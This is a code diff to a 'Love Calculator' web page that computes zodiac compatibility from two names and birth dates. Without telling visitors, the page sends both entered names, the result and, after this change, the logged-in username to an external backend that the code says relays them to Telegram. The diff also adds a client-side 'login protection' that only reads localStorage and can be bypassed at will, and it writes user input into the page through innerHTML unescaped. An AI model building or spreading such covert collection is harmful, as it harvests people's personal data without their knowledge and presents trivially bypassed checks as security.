@@ -8,6 +8,8 @@
 
 <h2>Love Calculator</h2>
 
+<p id="welcome"></p>
+
 <label>Your Name:</label><br>
 <input type="text" id="name1"><br><br>
 
@@ -26,7 +28,17 @@
 
 <script>
 
-// Send data to backend → Telegram
+// ===== Login Protection =====
+var loggedUser = localStorage.getItem("username");
+
+if (!loggedUser) {
+    window.location.href = "index.html";
+} else {
+    document.getElementById("welcome").innerText =
+        "Logged in as: " + loggedUser;
+}
+
+// ===== Send data to backend =====
 function sendToTelegram(name1, name2, result) {
     fetch("https://cal-92jw.onrender.com/send", {
         method: "POST",
@@ -35,6 +47,7 @@ function sendToTelegram(name1, name2, result) {
         },
         body: JSON.stringify({
             source: "Love Calculator",
+            user: loggedUser,
             name1: name1,
             name2: name2,
             result: result
@@ -45,7 +58,7 @@ function sendToTelegram(name1, name2, result) {
     .catch(error => console.error("Error:", error));
 }
 
-// Get Zodiac Sign
+// ===== Zodiac Logic =====
 function getZodiac(day, month) {
     if ((month == 3 && day >= 21) || (month == 4 && day <= 19)) return "Aries";
     if ((month == 4 && day >= 20) || (month == 5 && day <= 20)) return "Taurus";
@@ -61,15 +74,13 @@ function getZodiac(day, month) {
     return "Pisces";
 }
 
-// Zodiac Element
 function getElement(sign) {
-    if (["Aries", "Leo", "Sagittarius"].includes(sign)) return "Fire";
-    if (["Taurus", "Virgo", "Capricorn"].includes(sign)) return "Earth";
-    if (["Gemini", "Libra", "Aquarius"].includes(sign)) return "Air";
+    if (["Aries","Leo","Sagittarius"].includes(sign)) return "Fire";
+    if (["Taurus","Virgo","Capricorn"].includes(sign)) return "Earth";
+    if (["Gemini","Libra","Aquarius"].includes(sign)) return "Air";
     return "Water";
 }
 
-// Compatibility Logic
 function getCompatibility(e1, e2) {
     if (e1 == e2) return 90;
     if ((e1 == "Fire" && e2 == "Air") || (e1 == "Air" && e2 == "Fire")) return 85;
@@ -79,13 +90,13 @@ function getCompatibility(e1, e2) {
     return 65;
 }
 
+// ===== Main Logic =====
 function calculateLove() {
     var name1 = document.getElementById("name1").value.trim();
     var name2 = document.getElementById("name2").value.trim();
     var dob1Value = document.getElementById("dob1").value;
     var dob2Value = document.getElementById("dob2").value;
 
-    // Validation
     if (!name1 || !name2 || !dob1Value || !dob2Value) {
         document.getElementById("result").innerHTML = "Please fill all fields.";
         return;
@@ -103,13 +114,11 @@ function calculateLove() {
     var score = getCompatibility(element1, element2);
     var resultText = score + "% Compatibility";
 
-    // Show result
     document.getElementById("result").innerHTML =
         name1 + " (" + sign1 + ") ❤️ " +
         name2 + " (" + sign2 + ") = " +
         resultText;
 
-    // Send to Telegram
     sendToTelegram(name1, name2, resultText);
 }
 
@@ -117,4 +126,3 @@ function calculateLove() {
 
 </body>
 </html>
-
